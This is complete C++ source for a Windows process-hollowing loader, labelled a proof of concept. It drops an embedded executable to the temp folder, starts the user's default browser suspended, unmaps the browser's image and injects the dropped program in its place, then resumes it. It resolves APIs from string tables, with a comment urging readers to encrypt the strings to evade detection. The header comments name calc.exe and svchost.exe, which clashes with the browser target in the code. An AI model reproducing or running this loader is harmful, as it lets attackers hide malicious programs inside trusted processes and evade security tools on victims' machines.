//*******************************************************************************************************
// loadEXE.cpp : Defines the entry point for the console application.
//
// Proof-Of-Concept Code
// Copyright (c) 2004
// All rights reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, and/or sell copies of the Software, and to permit persons
// to whom the Software is furnished to do so, provided that the above
// copyright notice(s) and this permission notice appear in all copies of
// the Software and that both the above copyright notice(s) and this
// permission notice appear in supporting documentation.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT
// OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
// HOLDERS INCLUDED IN THIS NOTICE BE LIABLE FOR ANY CLAIM, OR ANY SPECIAL
// INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES WHATSOEVER RESULTING
// FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT,
// NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION
// WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
//
// Usage:
// loadEXE <EXE filename>
//
// This will execute calc.exe in suspended mode and replace its image with
// the new EXE's image.  The thread is then resumed, thus causing the new EXE to
// execute within the process space of svchost.exe.
//
//*******************************************************************************************************

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "tiny.h"
#include "resource.h"
struct PE_Header 
{
	unsigned long signature;
	unsigned short machine;
	unsigned short numSections;
	unsigned long timeDateStamp;
	unsigned long pointerToSymbolTable;
	unsigned long numOfSymbols;
	unsigned short sizeOfOptionHeader;
	unsigned short characteristics;
};

struct PE_ExtHeader
{
	unsigned short magic;
	unsigned char majorLinkerVersion;
	unsigned char minorLinkerVersion;
	unsigned long sizeOfCode;
	unsigned long sizeOfInitializedData;
	unsigned long sizeOfUninitializedData;
	unsigned long addressOfEntryPoint;
	unsigned long baseOfCode;
	unsigned long baseOfData;
	unsigned long imageBase;
	unsigned long sectionAlignment;
	unsigned long fileAlignment;
	unsigned short majorOSVersion;
	unsigned short minorOSVersion;
	unsigned short majorImageVersion;
	unsigned short minorImageVersion;
	unsigned short majorSubsystemVersion;
	unsigned short minorSubsystemVersion;
	unsigned long reserved1;
	unsigned long sizeOfImage;
	unsigned long sizeOfHeaders;
	unsigned long checksum;
	unsigned short subsystem;
	unsigned short DLLCharacteristics;
	unsigned long sizeOfStackReserve;
	unsigned long sizeOfStackCommit;
	unsigned long sizeOfHeapReserve;
	unsigned long sizeOfHeapCommit;
	unsigned long loaderFlags;
	unsigned long numberOfRVAAndSizes;
	unsigned long exportTableAddress;
	unsigned long exportTableSize;
	unsigned long importTableAddress;
	unsigned long importTableSize;
	unsigned long resourceTableAddress;
	unsigned long resourceTableSize;
	unsigned long exceptionTableAddress;
	unsigned long exceptionTableSize;
	unsigned long certFilePointer;
	unsigned long certTableSize;
	unsigned long relocationTableAddress;
	unsigned long relocationTableSize;
	unsigned long debugDataAddress;
	unsigned long debugDataSize;
	unsigned long archDataAddress;
	unsigned long archDataSize;
	unsigned long globalPtrAddress;
	unsigned long globalPtrSize;
	unsigned long TLSTableAddress;
	unsigned long TLSTableSize;
	unsigned long loadConfigTableAddress;
	unsigned long loadConfigTableSize;
	unsigned long boundImportTableAddress;
	unsigned long boundImportTableSize;
	unsigned long importAddressTableAddress;
	unsigned long importAddressTableSize;
	unsigned long delayImportDescAddress;
	unsigned long delayImportDescSize;
	unsigned long COMHeaderAddress;
	unsigned long COMHeaderSize;
	unsigned long reserved2;
	unsigned long reserved3;
};


struct SectionHeader
{
	unsigned char sectionName[8];
	unsigned long virtualSize;
	unsigned long virtualAddress;
	unsigned long sizeOfRawData;
	unsigned long pointerToRawData;
	unsigned long pointerToRelocations;
	unsigned long pointerToLineNumbers;
	unsigned short numberOfRelocations;
	unsigned short numberOfLineNumbers;
	unsigned long characteristics;
};

struct MZHeader
{
	unsigned short signature;
	unsigned short partPag;
	unsigned short pageCnt;
	unsigned short reloCnt;
	unsigned short hdrSize;
	unsigned short minMem;
	unsigned short maxMem;
	unsigned short reloSS;
	unsigned short exeSP;
	unsigned short chksum;
	unsigned short exeIP;
	unsigned short reloCS;
	unsigned short tablOff;
	unsigned short overlay;
	unsigned char reserved[32];
	unsigned long offsetToPE;
};


struct ImportDirEntry
{
	DWORD importLookupTable;
	DWORD timeDateStamp;
	DWORD fowarderChain;
	DWORD nameRVA;
	DWORD importAddressTable;
};


HANDLE ASD;
//Tip: Encrypt these strings :)
char CreateProcessb [32] = "CreateProcessA";
char VirtualAllocb  [32] = "VirtualAlloc";
char VirtualAllocXb  [32] = "VirtualAllocEx";
char GetThreadContextb [32] = "GetThreadContext"; 
char WriteProcessMemoryb [32] = "WriteProcessMemory";
char ReadProcessMemoryb [32] = "ReadProcessMemory";
char VirtualQueryExb [32] = "VirtualQueryEx";
char ZwUnmapViewOfSectionb [32] = "ZwUnmapViewOfSection";
char SetThreadContextb [32] = "SetThreadContext";
char VirtualProtectExb [32] = "VirtualProtectEx";
char VirtualAXb		   [20] = "VirtualAllocEx";
//
char Kernel32 [20] = "Kernel32.dll";
char ntdll [20] = "ntdll.dll";

//
typedef BOOL (__stdcall *VirtualAX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID (__stdcall *_VirtualA)(
  __in_opt  LPVOID lpAddress,
  __in      SIZE_T dwSize,
  __in      DWORD flAllocationType,
  __in      DWORD flProtect
);

typedef BOOL (WINAPI *CP)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION); // CreateProcessA
typedef BOOL (__stdcall *GetThreadCon)(
  __in     HANDLE hThread,
  __inout  LPCONTEXT lpContext
);
typedef BOOL (__stdcall *WPM)(
  __in   HANDLE hProcess,
  __in   LPVOID lpBaseAddress,
  __in   LPCVOID lpBuffer,
  __in   SIZE_T nSize,
  __out  SIZE_T *lpNumberOfBytesWritten
);
typedef BOOL (__stdcall *RPM)(
  __in   HANDLE hProcess,
  __in   LPCVOID lpBaseAddress,
  __out  LPVOID lpBuffer,
  __in   SIZE_T nSize,
  __out  SIZE_T *lpNumberOfBytesRead
);
typedef SIZE_T (__stdcall *VQE)(
  __in      HANDLE hProcess,
  __in_opt  LPCVOID lpAddress,
  __out     PMEMORY_BASIC_INFORMATION lpBuffer,
  __in      SIZE_T dwLength
);
typedef BOOL (__stdcall *STC)(
  __in  HANDLE hThread,
  __in  const CONTEXT *lpContext
);

typedef BOOL (__stdcall *VirtualPE)(
  __in   HANDLE hProcess,
  __in   LPVOID lpAddress,
  __in   SIZE_T dwSize,
  __in   DWORD flNewProtect,
  __out  PDWORD lpflOldProtect
);





char* GetBrowserPath( )
{
    HKEY hKey;
    char szBuffer[1080];
    unsigned long lSize = sizeof( szBuffer ) + 1;
    if( RegOpenKeyEx( HKEY_CLASSES_ROOT, "http\\shell\\open\\command", 0, KEY_ALL_ACCESS, &hKey ) == 0 ) {
        if( RegQueryValueEx( hKey, NULL, NULL, NULL, (unsigned char*)szBuffer, &lSize ) == 0 ) {
            RegCloseKey( hKey ); 
            return( strtok( szBuffer, "\"" ) );
        }
        RegCloseKey( hKey );
    }
    return( "Unknown" );
}

//**********************************************************************************************************
//
// This function reads the MZ, PE, PE extended and Section Headers from an EXE file.
//
//**********************************************************************************************************

bool readPEInfo(FILE *fp, MZHeader *outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH,
				SectionHeader **outSecHdr)
{
	fseek(fp, 0, SEEK_END);
	long fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if(fileSize < sizeof(MZHeader))
	{	
		return false;
	}

	// read MZ Header
	MZHeader mzH;
	fread(&mzH, sizeof(MZHeader), 1, fp);

	if(mzH.signature != 0x5a4d)		// MZ
	{
		return false;
	}

	////printf("Offset to PE Header = %X\n", mzH.offsetToPE);

	if((unsigned long)fileSize < mzH.offsetToPE + sizeof(PE_Header))
	{	
		return false;
	}

	// read PE Header
	fseek(fp, mzH.offsetToPE, SEEK_SET);
	PE_Header peH;
	fread(&peH, sizeof(PE_Header), 1, fp);

	////printf("Size of option header = %d\n", peH.sizeOfOptionHeader);
	////printf("Number of sections = %d\n", peH.numSections);

	if(peH.sizeOfOptionHeader != sizeof(PE_ExtHeader))
	{		
		return false;
	}

	// read PE Ext Header
	PE_ExtHeader peXH;

	fread(&peXH, sizeof(PE_ExtHeader), 1, fp);

	////printf("Import table address = %X\n", peXH.importTableAddress);
	////printf("Import table size = %X\n", peXH.importTableSize);
	////printf("Import address table address = %X\n", peXH.importAddressTableAddress);
	////printf("Import address table size = %X\n", peXH.importAddressTableSize);


	// read the sections
	SectionHeader *secHdr = new SectionHeader[peH.numSections];

	fread(secHdr, sizeof(SectionHeader) * peH.numSections, 1, fp);

	*outMZ = mzH;
	*outPE = peH;
	*outpeXH = peXH;
	*outSecHdr = secHdr;

	return true;
}


//**********************************************************************************************************
//
// This function calculates the size required to load an EXE into memory with proper alignment.
//
//**********************************************************************************************************

int calcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
				       SectionHeader *inSecHdr)
{
	int result = 0;
	int alignment = inpeXH->sectionAlignment;

	if(inpeXH->sizeOfHeaders % alignment == 0)
		result += inpeXH->sizeOfHeaders;
	else
	{
		int val = inpeXH->sizeOfHeaders / alignment;
		val++;
		result += (val * alignment);
	}


	for(int i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].virtualSize)
		{
			if(inSecHdr[i].virtualSize % alignment == 0)
				result += inSecHdr[i].virtualSize;
			else
			{
				int val = inSecHdr[i].virtualSize / alignment;
				val++;
				result += (val * alignment);
			}
		}
	}

	return result;
}


//**********************************************************************************************************
//
// This function calculates the aligned size of a section
//
//**********************************************************************************************************

unsigned long getAlignedSize(unsigned long curSize, unsigned long alignment)
{	
	if(curSize % alignment == 0)
		return curSize;
	else
	{
		int val = curSize / alignment;
		val++;
		return (val * alignment);
	}
}


//**********************************************************************************************************
//
// This function loads a PE file into memory with proper alignment.
// Enough memory must be allocated at ptrLoc.
//
//**********************************************************************************************************

bool loadPE(FILE *fp, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			SectionHeader *inSecHdr, LPVOID ptrLoc)
{
	char *outPtr = (char *)ptrLoc;

	//printf("loadPE 1 \n");
	fseek(fp, 0, SEEK_SET);
	unsigned long headerSize = inpeXH->sizeOfHeaders;

	// certain PE files have sectionHeaderSize value > size of PE file itself.  
	// this loop handles this situation by find the section that is nearest to the
	// PE header.

	//printf("loadPE 2 \n");
	for(int i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].pointerToRawData < headerSize)
			headerSize = inSecHdr[i].pointerToRawData;
	}

	//printf("loadPE 3 \n");
	// read the PE header
	unsigned long readSize = fread(outPtr, 1, headerSize, fp);
	////printf("HeaderSize = %d\n", headerSize);
	if(readSize != headerSize)
	{
		return false;		
	}

	//printf("loadPE 4 \n");
	outPtr += getAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);

	//printf("loadPE 5 \n");
	// read the sections
	for(i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].sizeOfRawData > 0)
		{
			unsigned long toRead = inSecHdr[i].sizeOfRawData;
			if(toRead > inSecHdr[i].virtualSize)
				toRead = inSecHdr[i].virtualSize;

			fseek(fp, inSecHdr[i].pointerToRawData, SEEK_SET);
			readSize = fread(outPtr, 1, toRead, fp);

			if(readSize != toRead)
			{
				return false;
			}
			outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
		}
		else
		{
			// this handles the case where the PE file has an empty section. E.g. UPX0 section
			// in UPXed files.

			if(inSecHdr[i].virtualSize)
				outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
		}
	}

	//printf("loadPE 6 \n");
	return true;
}


struct FixupBlock
{
	unsigned long pageRVA;
	unsigned long blockSize;
};


//**********************************************************************************************************
//
// This function loads a PE file into memory with proper alignment.
// Enough memory must be allocated at ptrLoc.
//
//**********************************************************************************************************

void doRelocation(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			      SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD newBase)
{
	if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
	{
		FixupBlock *fixBlk = (FixupBlock *)((char *)ptrLoc + inpeXH->relocationTableAddress);
		long delta = newBase - inpeXH->imageBase;

		while(fixBlk->blockSize)
		{
			////printf("Addr = %X\n", fixBlk->pageRVA);
			////printf("Size = %X\n", fixBlk->blockSize);

			int numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;
			////printf("Num Entries = %d\n", numEntries);

			unsigned short *offsetPtr = (unsigned short *)(fixBlk + 1);

			for(int i = 0; i < numEntries; i++)
			{
				DWORD *codeLoc = (DWORD *)((char *)ptrLoc + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));
				
				int relocType = (*offsetPtr & 0xF000) >> 12;
				
				////printf("Val = %X\n", *offsetPtr);
				////printf("Type = %X\n", relocType);

				if(relocType == 3)
					*codeLoc = ((DWORD)*codeLoc) + delta;
				else
				{
					//printf("Unknown relocation type = %d\n", relocType);
				}
				offsetPtr++;
			}

			fixBlk = (FixupBlock *)offsetPtr;
		}
	}	
}


#define TARGETPROC "firefox.exe"

typedef struct _PROCINFO
{
	DWORD baseAddr;
	DWORD imageSize;
} PROCINFO;



//**********************************************************************************************************
//
// Creates the original EXE in suspended mode and returns its info in the PROCINFO structure.
//
//**********************************************************************************************************


BOOL createChild(PPROCESS_INFORMATION pi, PCONTEXT ctx, PROCINFO *outChildProcInfo)
{
	//printf("createChild 1\n");
	Sleep(1000);
	STARTUPINFO si = {0};
	CP CreateProc;
	GetThreadCon GetTC;
	RPM rpm;
	VQE vqe;
	CreateProc = (CP)GetProcAddress(GetModuleHandle(Kernel32), CreateProcessb);
	GetTC = (GetThreadCon)GetProcAddress(GetModuleHandle(Kernel32), GetThreadContextb); 
	rpm = (RPM)GetProcAddress(GetModuleHandle(Kernel32), ReadProcessMemoryb);
	vqe = (VQE)GetProcAddress(GetModuleHandle(Kernel32), VirtualQueryExb);
	//printf("createChild 2\n");
	if(CreateProc(NULL, GetBrowserPath(),
		             NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, pi))		
	{
		ctx->ContextFlags=CONTEXT_FULL;
		GetTC(pi->hThread, ctx);

		DWORD *pebInfo = (DWORD *)ctx->Ebx;
		DWORD read;
		rpm(pi->hProcess, &pebInfo[2], (LPVOID)&(outChildProcInfo->baseAddr), sizeof(DWORD), &read);
	
		DWORD curAddr = outChildProcInfo->baseAddr;
		MEMORY_BASIC_INFORMATION memInfo;
		while(vqe(pi->hProcess, (LPVOID)curAddr, &memInfo, sizeof(memInfo)))
		{
			if(memInfo.State == MEM_FREE)
				break;
			curAddr += memInfo.RegionSize;
		}
		outChildProcInfo->imageSize = (DWORD)curAddr - (DWORD)outChildProcInfo->baseAddr;

		return TRUE;
	}

	//printf("createChild 3\n");
	return FALSE;
}


//**********************************************************************************************************
//
// Returns true if the PE file has a relocation table
//
//**********************************************************************************************************

BOOL hasRelocationTable(PE_ExtHeader *inpeXH)
{
	if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
	{
		return TRUE;
	}
	return FALSE;
}


typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);


//**********************************************************************************************************
//
// To replace the original EXE with another one we do the following.
// 1) Create the original EXE process in suspended mode.
// 2) Unmap the image of the original EXE.
// 3) Allocate memory at the baseaddress of the new EXE.
// 4) Load the new EXE image into the allocated memory.  
// 5) Windows will do the necessary imports and load the required DLLs for us when we resume the suspended 
//    thread.
//
// When the original EXE process is created in suspend mode, GetThreadContext returns these useful
// register values.
// EAX - process entry point
// EBX - points to PEB
//
// So before resuming the suspended thread, we need to set EAX of the context to the entry point of the
// new EXE.
//
//**********************************************************************************************************

void doFork(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD imageSize)
{
	//printf("doFork 1 \n");
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	PROCINFO childInfo;
	VirtualAX VirtualA;
	STC stc;
	WPM wpm;
	VirtualPE VirtualP;
	VirtualA = (VirtualAX)GetProcAddress(GetModuleHandle(Kernel32), VirtualAXb);
	wpm = (WPM)GetProcAddress(GetModuleHandle(Kernel32), WriteProcessMemoryb);
	stc = (STC)GetProcAddress(GetModuleHandle(Kernel32), SetThreadContextb);
	VirtualP = (VirtualPE)GetProcAddress(GetModuleHandle(Kernel32), VirtualProtectExb);
	//printf("doFork 2 \n");
	if(createChild(&pi, &ctx, &childInfo)) 
	{		
		//printf("Original EXE loaded (PID = %d).\n", pi.dwProcessId);
		//printf("Original Base Addr = %X, Size = %X\n", childInfo.baseAddr, childInfo.imageSize);
		
	//printf("doFork 3 \n");
		LPVOID v = (LPVOID)NULL;
		
		if(inpeXH->imageBase == childInfo.baseAddr && imageSize <= childInfo.imageSize)
		{
			// if new EXE has same baseaddr and is its size is <= to the original EXE, just
			// overwrite it in memory
			v = (LPVOID)childInfo.baseAddr;
			DWORD oldProtect;
			VirtualP(pi.hProcess, (LPVOID)childInfo.baseAddr, childInfo.imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);			
			
			//printf("Using Existing Mem for New EXE at %X\n", (unsigned long)v);
		}
		else
		{
			// get address of ZwUnmapViewOfSection
			PTRZwUnmapViewOfSection pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(ntdll), ZwUnmapViewOfSectionb);

			// try to unmap the original EXE image
			if(pZwUnmapViewOfSection(pi.hProcess, (LPVOID)childInfo.baseAddr) == 0)
			{
				// allocate memory for the new EXE image at the prefered imagebase.
				v = (void *)VirtualA(pi.hProcess, (LPVOID)inpeXH->imageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				//if(v)
					//printf("Unmapped and Allocated Mem for New EXE at %X\n", (unsigned long)v);
			}
		}

	//printf("doFork 4 \n");
		if(!v && hasRelocationTable(inpeXH))
		{
			// if unmap failed but EXE is relocatable, then we try to load the EXE at another
			// location
			v = (void *)VirtualA(pi.hProcess, (void *)NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(v)
			{
				// we've got to do the relocation ourself if we load the image at another
				// memory location				
				doRelocation(inMZ, inPE, inpeXH, inSecHdr, ptrLoc, (DWORD)v);
			}
		}
	
	//printf("doFork 5 \n");	
		if(v)
		{						
			// patch the EXE base addr in PEB (PEB + 8 holds process base addr)
			DWORD *pebInfo = (DWORD *)ctx.Ebx;
			DWORD wrote;						
			wpm(pi.hProcess, &pebInfo[2], &v, sizeof(DWORD), &wrote);

			// patch the base addr in the PE header of the EXE that we load ourselves
			PE_ExtHeader *peXH = (PE_ExtHeader *)((DWORD)inMZ->offsetToPE + sizeof(PE_Header) + (DWORD)ptrLoc);
			peXH->imageBase = (DWORD)v;
			
			if(wpm(pi.hProcess, v, ptrLoc, imageSize, NULL))
			{	
				//printf("New EXE image injected into process.\n");

				ctx.ContextFlags=CONTEXT_FULL;				
				//ctx.Eip = (DWORD)v + ((DWORD)dllLoaderWritePtr - (DWORD)ptrLoc);
				
				if((DWORD)v == childInfo.baseAddr)
				{
					ctx.Eax = (DWORD)inpeXH->imageBase + inpeXH->addressOfEntryPoint;		// eax holds new entry point
				}
				else
				{
					// in this case, the DLL was not loaded at the baseaddr, i.e. manual relocation was
					// performed.
					ctx.Eax = (DWORD)v + inpeXH->addressOfEntryPoint;		// eax holds new entry point
				}

				stc(pi.hThread,&ctx);

				ResumeThread(pi.hThread);
				//printf("Process resumed (PID = %d).\n", pi.dwProcessId);
			}
			else
			{
				TerminateProcess(pi.hProcess, 0);
			}
		}
		else
		{
			TerminateProcess(pi.hProcess, 0);
		}
	}
	else
	{
		//printf("Cannot load %s\n", TARGETPROC);
	}
	
	//printf("doFork 6 \n");	
}

char Name [MAX_PATH] = "";
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	char	strTmpPath[MAX_PATH];
	
    GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(Name, "%s%d.exe", strTmpPath, GetTickCount());

	//ssageBox(NULL, strBinPath, "strBinPath", MB_OK);
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		return FALSE;
	}
	
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		return FALSE;
	}
	hFile = CreateFile
		(Name, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		return FALSE;
	}
	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	//essageBox(NULL, strBinPath, "Buffer", MB_OK);
	CloseHandle(hFile);
	FreeResource(hRes);
return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if(ReleaseResource(NULL, IDR_BINARY1, "BINARY") == FALSE)
	{
	return 0;
	}
	FILE *fp = fopen(Name, "rb");
	if(fp)
	{
	//printf("Exe open \n");
		MZHeader mzH;
		PE_Header peH;
		PE_ExtHeader peXH;
		SectionHeader *secHdr;
		_VirtualA VirtualA;

		VirtualA = (_VirtualA)GetProcAddress(GetModuleHandle(Kernel32), VirtualAllocb);
		if(readPEInfo(fp, &mzH, &peH, &peXH, &secHdr))
		{
	//printf("readPEInfo \n");
			int imageSize = calcTotalImageSize(&mzH, &peH, &peXH, secHdr);

			LPVOID ptrLoc = VirtualA(NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(ptrLoc)
			{
	//printf("VirtualA \n");
				loadPE(fp, &mzH, &peH, &peXH, secHdr, ptrLoc);	
				doFork(&mzH, &peH, &peXH, secHdr, ptrLoc, imageSize);								
			}
		}

		fclose(fp);
	}
	else
	{
	MessageBox(NULL, "FAIL", "Fail", MB_OK);
	}

	Sleep(1000);
	
	return 0;
}

